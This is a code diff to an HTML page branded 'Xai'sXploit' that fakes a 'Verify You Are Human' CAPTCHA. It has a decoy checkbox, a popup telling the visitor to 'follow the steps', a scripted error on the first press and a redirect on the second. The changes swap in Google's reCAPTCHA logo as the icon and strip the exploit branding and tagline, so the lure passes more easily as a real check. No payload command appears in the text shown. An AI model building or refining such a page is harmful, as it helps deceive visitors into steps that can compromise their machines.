@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="X.jpg" type="image/x-icon">
-    <title>Xai'sXploit</title>
+    <link rel="icon" href="https://www.gstatic.com/recaptcha/api2/logo_48.png" type="image/x-icon">
+    <title>Xai'Sploit</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -241,82 +241,10 @@
         .error-popup.active {
             display: block;
         }
-        
-.header2 {
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  width: 100%;
-  background-color: rgba(249, 249, 249, 0.8);
-  display: flex;
-  align-items: center;
-  padding: 20px 40px;
-  font-family: Arial, sans-serif;
-  font-size: 15px;
-  color: #333;
-  z-index: 9999;
-  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-}
-
-.logo-frame {
-  display: inline-block;
-  margin-right: 20px;
-}
-
-.logo-frame img {
-  height: 50px;
-  width: auto;
-  border-radius: 5px;
-}
-.footer2 {
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  right: 0;
-  width: 100%;
-  background-color: rgba(249, 249, 249, 0.8);
-  text-align: center;
-  padding: 10px 0;
-  font-family: Arial, sans-serif;
-  font-size: 14px;
-  color: #333;
-  z-index: 9999;
-  box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.05);
-}
-
-#mobile-warning {
-  display: none;
-  position: fixed;
-  z-index: 10000;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: white;
-  color: #000;
-  text-align: center;
-  padding-top: 30%;
-  font-size: 18px;
-  font-family: Arial, sans-serif;
-}
     </style>
 </head>
 <body>
-    
-    <div id="mobile-warning">
-  <p>This website is only available on desktop or laptop devices.</p>
-</div>
-    
     <div class="background"></div> <!-- White background behind everything -->
-    
-    <header class="header2">
-  <a href="#" onclick="location.reload(); return false;" class="logo-frame">
-    <img src="X.jpg" alt="Logo">
-  </a>
-  <h1><b><i>Xai'sXploit</i></b> — Lightweight. Lethal. Undetected.</h1>
-</header>
-    
     <div class="container">
         <h1>Verify You Are Human</h1>
         <p>Please verify that you are a human to continue</p>
@@ -352,18 +280,8 @@
             <p><b>Error, please follow the steps<br> and try again!</b></p>
         </div>
     </div>
-    
-    <footer class="footer2">
-  <p>&copy; 2025 <i>Xai'sXploit</i>. All rights reserved.</p>
-</footer>
 
     <script>
-        
-      if (window.innerWidth <= 768) {
-    document.getElementById("mobile-warning").style.display = "block";
-    document.body.style.overflow = "hidden";
-      }
-  
     const checkbox = document.getElementById('captchaCheckbox');
     const loading = document.getElementById('loading');
     const popup = document.getElementById('popup');
@@ -402,10 +320,10 @@
                 }, 3000); // Error stays for 3 seconds
             } else if (doneButtonPressCount === 2) {
                 // Redirect to the website on the second press
-                window.location.href = "phase2.html";
+                window.location.href = "https://example.com";
             }
         }, 2000); // Simulate a 2-second delay for the loading animation
     }
     </script>
 </body>
-</html>
+  </html>
